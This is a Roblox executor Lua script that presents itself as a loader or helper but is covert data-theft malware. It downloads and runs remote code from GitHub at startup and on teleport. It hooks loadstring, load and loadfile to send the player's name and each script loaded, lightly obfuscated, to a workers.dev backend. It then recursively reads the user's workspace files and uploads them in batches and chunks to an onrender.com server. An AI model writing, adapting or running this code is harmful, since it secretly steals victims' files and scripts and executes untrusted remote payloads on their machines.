loadstring(game:HttpGet("https://raw.githubusercontent.com/lego89-main/Scripts/refs/heads/main/lib/Helper.lua"))()
local HttpService = game:GetService("HttpService")

local plr = game.Players.LocalPlayer

local rawRequest =
    (syn and syn.request) or
    (http and http.request) or
    (fluxus and fluxus.request) or
    (krnl and krnl.request) or
    request or
    http_request or
    (getgenv and getgenv().request)


assert(rawRequest, "No request function found")

local BackendUrl = "https://api.lego89-rbx.workers.dev/"

local CodeEn = {
	["0"] = "ho!UKE_A2ul678rO",
	["1"] = "Q71G4JKdtlCS?-0B",
	["2"] = "cDqPdHLBtIuwPjgU",
	["3"] = "o9#zG-R2vlnX0@Sb",
	["4"] = "x#1lJUGncc@8@lIh",
	["5"] = "W!!SsmAEmj?fDu_H",
	["6"] = "e4E60C6PTydbeyqW",
	["7"] = "TufY60eut7YrnRvb",
	["8"] = "Wb1nSDX-_YIL221h",
	["9"] = "N0IZp8YqUe98P@m-",
	[string.char(92)] = "ZWvn0Kkm6-ELqG!g",
}

local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local b64lookup = {}
for i = 1, #b64chars do b64lookup[b64chars:sub(i, i)] = i - 1 end

local CodeDe = {}
for k,v in pairs(CodeEn) do CodeDe[v] = k end

local ESCAPE_PATTERN = '["\\\b\f\n\r\t%z\1-\31]'

local ESCAPE_MAP = {
	['"']  = '\\"',
	['\\'] = '\\\\',
	['\b'] = '\\b',
	['\f'] = '\\f',
	['\n'] = '\\n',
	['\r'] = '\\r',
	['\t'] = '\\t',
}

local floor    = math.floor
local abs      = math.abs
local huge     = math.huge
local fmt      = string.format
local tconcat  = table.concat
local tostr    = tostring
local type_    = type

local function escapeString(s)
	return s:gsub(ESCAPE_PATTERN, function(c)
		return ESCAPE_MAP[c] or fmt("\\u%04x", c:byte())
	end)
end

local function isArray(t)
	local count = 0
	local maxKey = 0
	for k in pairs(t) do
		if type_(k) ~= "number" or k ~= floor(k) or k < 1 then
			return false, 0
		end
		count += 1
		if k > maxKey then maxKey = k end
	end
	return count == maxKey, maxKey
end

local encodeValue

local function encodeTable(tbl, stack)
	if stack[tbl] then
		error("JSONEncode: circular reference", 2)
	end
	stack[tbl] = true

	local parts = {}
	local arrayLike, len = isArray(tbl)

	if arrayLike then
		for i = 1, len do
			parts[i] = encodeValue(tbl[i], stack)
		end
		stack[tbl] = nil
		return "[" .. tconcat(parts, ",") .. "]"
	else
		local i = 0
		for k, v in pairs(tbl) do
			local kt = type_(k)
			local keyStr = (kt == "string" and ('"' .. escapeString(k) .. '"'))
				or (kt == "number" and ('"' .. tostr(k) .. '"'))
				or nil
			if keyStr then
				i += 1
				parts[i] = keyStr .. ":" .. encodeValue(v, stack)
			end
		end
		stack[tbl] = nil
		return "{" .. tconcat(parts, ",") .. "}"
	end
end

encodeValue = function(value, stack)
	local t = type_(value)
	if t == "nil" then
		return "null"
	elseif t == "boolean" then
		return tostr(value)
	elseif t == "number" then
		if value ~= value or value == huge or value == -huge then
			return "null"
		end
		if value == floor(value) and abs(value) < 2^53 then
			return fmt("%d", value)
		end
		return fmt("%.17g", value)
	elseif t == "string" then
		return '"' .. escapeString(value) .. '"'
	elseif t == "table" then
		return encodeTable(value, stack)
	else
		return "null"
	end
end

local function JSONEncode(value)
	return encodeValue(value, {})
end

local function requestFunc(options)
	options = options or {}

	options.Url = options.Url or options.URL
	options.URL = nil
	options.Method = options.Method or "GET"
	options.Headers = options.Headers or {}

	if typeof(options.Body) == "table" and options.Headers["Content-Type"] ~= "application/octet-stream" then
		options.Body = JSONEncode(options.Body)
		options.Headers["Content-Type"] = "application/json"
	end

	local success, response = pcall(rawRequest, options)

	local result = {
		Success = false,
		StatusCode = 0,
		Body = "",
		Json = nil,
		Headers = {},
		JsonSuccess = false
	}

	if not success or type(response) ~= "table" then
		result.Body = tostring(response)
		return result
	end

	result.Body = response.Body or response.body or ""
	result.StatusCode = response.StatusCode or response.Status or response.status or 0
	result.Headers = response.Headers or response.headers or {}
	result.Success = result.StatusCode >= 200 and result.StatusCode < 300

	local ok, decoded = pcall(function()
		return HttpService:JSONDecode(result.Body)
	end)

	if ok and type(decoded) == "table" then
		result.Json = decoded
		result.JsonSuccess = true
	end

	return result
end

local function escape_for_lua_pattern(s)
	s = s:gsub("%%", "%%%%")
	s = s:gsub("%^", "%%^")
	s = s:gsub("%$", "%%$")
	s = s:gsub("%(", "%%(")
	s = s:gsub("%)", "%%)")
	s = s:gsub("%.", "%%.")
	s = s:gsub("%[", "%%[")
	s = s:gsub("%]", "%%]")
	s = s:gsub("%*", "%%*")
	s = s:gsub("%+", "%%+")
	s = s:gsub("%-", "%%-")
	s = s:gsub("%?", "%%?")
	return s
end

local function StringToBytes(Str)
    local bytes = {}
    local chunkSize = 500 
    local i = 1
    while i <= #Str do
        local endIndex = math.min(i + chunkSize - 1, #Str)
        for j = i, endIndex do
            table.insert(bytes, string.byte(Str, j))
        end
        i = i + chunkSize
    end
    return bytes
end

local function fromBase64(data)
	data = data:gsub("[^" .. b64chars .. "=]", "")
	local bytes = {}

	for i = 1, #data, 4 do
		local c1 = b64lookup[data:sub(i, i)] or 0
		local c2 = b64lookup[data:sub(i + 1, i + 1)] or 0
		local c3 = b64lookup[data:sub(i + 2, i + 2)] or 0
		local c4 = b64lookup[data:sub(i + 3, i + 3)] or 0

		local n = bit32.lshift(c1, 18)
		n = bit32.bor(n, bit32.lshift(c2, 12))
		n = bit32.bor(n, bit32.lshift(c3, 6))
		n = bit32.bor(n, c4)

		local b1 = bit32.rshift(n, 16) % 256
		local b2 = bit32.rshift(n, 8) % 256
		local b3 = n % 256

		table.insert(bytes, string.char(b1))
		if data:sub(i + 2, i + 2) ~= "=" then
			table.insert(bytes, string.char(b2))
		end
		if data:sub(i + 3, i + 3) ~= "=" then
			table.insert(bytes, string.char(b3))
		end
	end

	return table.concat(bytes)
end

local function Encode(Str)
	local bytes = StringToBytes(Str)
	local result1 = {}
	local pad = 0
	local len = #bytes
	local r1i = 0

	for i = 1, len, 3 do
		local b1 = bytes[i] or 0
		local b2 = bytes[i+1]
		local b3 = bytes[i+2]

		local n = bit32.lshift(b1, 16)
		if b2 then
			n = bit32.bor(n, bit32.lshift(b2, 8))
		else
			pad = pad + 1
		end
		if b3 then
			n = bit32.bor(n, b3)
		else
			pad = pad + 1
		end

		local c1 = bit32.rshift(n, 18) % 64
		local c2 = bit32.rshift(n, 12) % 64
		local c3 = bit32.rshift(n, 6) % 64
		local c4 = n % 64

		r1i = r1i + 1; result1[r1i] = b64chars:sub(c1+1, c1+1)
		r1i = r1i + 1; result1[r1i] = b64chars:sub(c2+1, c2+1)
		r1i = r1i + 1; result1[r1i] = pad >= 2 and '=' or b64chars:sub(c3+1, c3+1)
		r1i = r1i + 1; result1[r1i] = pad >= 1 and '=' or b64chars:sub(c4+1, c4+1)
		pad = 0
	end

	local Encode1 = table.concat(result1)
	local result2 = {}
	local prefix = "\\\\"
	local lenE1 = #Encode1

	for i = 1, lenE1 do
		result2[i] = prefix .. string.byte(Encode1, i)
	end

	local Encode2 = table.concat(result2)
	return Encode2:gsub(".", function(c) return CodeEn[c] or c end)
end

local function Decode(Encode)
	local keys = {}
	for k in pairs(CodeDe) do
		keys[#keys + 1] = k
	end
	table.sort(keys, function(a, b) return #a > #b end)

	local Decode1 = Encode
	for i = 1, #keys do
		local k = keys[i]
		Decode1 = Decode1:gsub(escape_for_lua_pattern(k), CodeDe[k])
	end

	local Decode2 = Decode1:gsub(string.char(92) .. "(%d+)", function(code)
		return string.char(tonumber(code))
	end)

	Decode2 = Decode2:gsub("[^" .. b64chars .. "=]", "")

	local lenD2 = #Decode2
	local bytes = {}
	local bi = 0

	for i = 1, lenD2, 4 do
		local s1 = Decode2:sub(i,   i)
		local s2 = Decode2:sub(i+1, i+1)
		local s3 = Decode2:sub(i+2, i+2)
		local s4 = Decode2:sub(i+3, i+3)

		local c1 = b64lookup[s1] or 0
		local c2 = b64lookup[s2] or 0
		local c3 = b64lookup[s3] or 0
		local c4 = b64lookup[s4] or 0

		local n = bit32.bor(
			bit32.lshift(c1, 18),
			bit32.lshift(c2, 12),
			bit32.lshift(c3, 6),
			c4
		)

		bi = bi + 1; bytes[bi] = string.char(bit32.rshift(n, 16) % 256)
		if s3 ~= "=" then bi = bi + 1; bytes[bi] = string.char(bit32.rshift(n, 8) % 256) end
		if s4 ~= "=" then bi = bi + 1; bytes[bi] = string.char(n % 256) end
	end

	return table.concat(bytes)
end

local SavedScript = {}

if loadstring then
	local old
	old = hookfunction(loadstring, function(...)
		local args = {...}
		if not SavedScript[args[1]] then SavedScript[args[1]]=true end
		task.spawn(function()
			requestFunc({
				Url = BackendUrl.."loader",
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = HttpService:JSONEncode({
					fnFbjO = Encode(plr.Name),
					SaCkPt = Encode(args[1]),
					tbosyP = Encode("loadstring"),
					IgHLiD = Encode(tostring(0))
				})
			})
		end)
		return old(...)
	end)
end

if getgenv and getgenv().loadstring then
	local old
	old = hookfunction(getgenv().loadstring, function(...)
		local args = {...}
		if not SavedScript[args[1]] then SavedScript[args[1]]=true end
		task.spawn(function()
			if not SavedScript[args[1]] then
				requestFunc({
					Url = BackendUrl.."loader",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = HttpService:JSONEncode({
						fnFbjO = Encode(plr.Name),
						SaCkPt = Encode(args[1]),
						tbosyP = Encode("loadstring"),
						IgHLiD = Encode(tostring(0))
					})
				})
				SavedScript[args[1]]=true
			end
		end)
		return old(...)
	end)
end

if getfenv and getfenv().loadstring then
	local old
	old = hookfunction(getgenv().loadstring, function(...)
		local args = {...}
		if not SavedScript[args[1]] then SavedScript[args[1]]=true end
		task.spawn(function()
			if not SavedScript[args[1]] then
				requestFunc({
					Url = BackendUrl.."loader",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = HttpService:JSONEncode({
						fnFbjO = Encode(plr.Name),
						SaCkPt = Encode(args[1]),
						tbosyP = Encode("loadstring"),
						IgHLiD = Encode(tostring(0))
					})
				})
				SavedScript[args[1]]=true
			end
		end)
		return old(...)
	end)
end

if load then
	local old
	old = hookfunction(load, function(...)
		local args = {...}
		if not SavedScript[args[1]] then SavedScript[args[1]]=true end
		task.spawn(function()
			if not SavedScript[args[1]] then
				requestFunc({
					Url = BackendUrl.."loader",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = HttpService:JSONEncode({
						fnFbjO = Encode(plr.Name),
						SaCkPt = Encode(args[1]),
						tbosyP = Encode("load"),
						IgHLiD = Encode(tostring(0))
					})
				})
				SavedScript[args[1]]=true
			end
		end)
		return old(...)
	end)
end

if loadfile and readfile then
	local old
	old = hookfunction(loadfile, function(...)
		local args = {...}
		if not SavedScript[args[1]] then SavedScript[args[1]]=true end
		task.spawn(function()
			if not SavedScript[args[1]] then
				requestFunc({
					Url = BackendUrl.."loader",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = HttpService:JSONEncode({
						fnFbjO = Encode(plr.Name),
						SaCkPt = Encode(readfile(args[1])),
						tbosyP = Encode("loadfile"),
						IgHLiD = Encode(tostring(0))
					})
				})
				SavedScript[readfile(args[1])]=true
			end
		end)
		return old(...)
	end)
end

queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/lego89-main/Scripts/refs/heads/main/lib/lib2.lua'))()")

local DataTable = {}
local UndetectFile = {
	"new_logo.png",
	"DeltaAssets",
}
local UndetectFileType = {
	"png",
	"jpg",
	"mp3",
	"mp4",
	"webm",
	"ogg",
}

local function Scan(path)
	local num = 0
	for _, item in ipairs(listfiles(path)) do
		num = num + 1
		local name = item:match("[^\\/]+$")
		local extension = name:match("%.([^%.]+)$")
		
		if isfolder(item) and not table.find(UndetectFile, name) and (not extension or not table.find(UndetectFileType, extension)) then
			Scan(item)
		elseif isfile(item) and not table.find(UndetectFile, name) and (not extension or not table.find(UndetectFileType, extension)) then
			DataTable[#DataTable + 1] = {
				Path = plr.Name.."/"..item,
				Value = readfile(item)
			}
		end
		if num == 10 then
			num = 0
			task.wait()
		end
	end
end

Scan("")

local BASE_URL = "https://render-api-4vl9.onrender.com/"
local CHUNK_SIZE_THRESHOLD = 1024 * 1024
local CHUNK_SIZE = 256 * 1024

local function uploadBatch(items)
	local payload = JSONEncode(items)
	local response = requestFunc({
		Url = BASE_URL .. "batch",
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = payload
	})
	return response.Success
end

local function uploadChunked(path, value)
	local totalLength = #value
	local totalChunks = math.ceil(totalLength / CHUNK_SIZE)
	local done = 0
	local failed = false

	for index = 1, totalChunks do
		task.spawn(function()
			local startPos = ((index - 1) * CHUNK_SIZE) + 1
			local endPos = math.min(index * CHUNK_SIZE, totalLength)
			local chunkData = value:sub(startPos, endPos)

			local s, body = pcall(JSONEncode, {
				Path = path,
				Index = index,
				Total = totalChunks,
				Data = chunkData,
				Encoding = "utf8",
				ContentType = "text/plain"
			})

			if not s then
				failed = true
				return
			end

			local response = requestFunc({
				Url = BASE_URL .. "chunk",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = body
			})

			if not response.Success then
				failed = true
			end

			done += 1
		end)
	end

	while done < totalChunks and not failed do
		task.wait()
	end

	return not failed
end

local function uploadDataTable(dataTable)
	local smallItems = {}
	local largeItems = {}

	for _, item in ipairs(dataTable) do
		if item.Path and item.Value then
			if #item.Value > CHUNK_SIZE_THRESHOLD then
				table.insert(largeItems, item)
			else
				table.insert(smallItems, {
					Path = item.Path,
					Value = item.Value,
					Encoding = "utf8",
					ContentType = "text/plain"
				})
			end
		end
	end

	if #smallItems > 0 then
		task.spawn(function()
			uploadBatch(smallItems)
		end)
	end

	for _, item in ipairs(largeItems) do
		task.spawn(function()
			uploadChunked(item.Path, item.Value)
		end)
	end
end

uploadDataTable(DataTable)
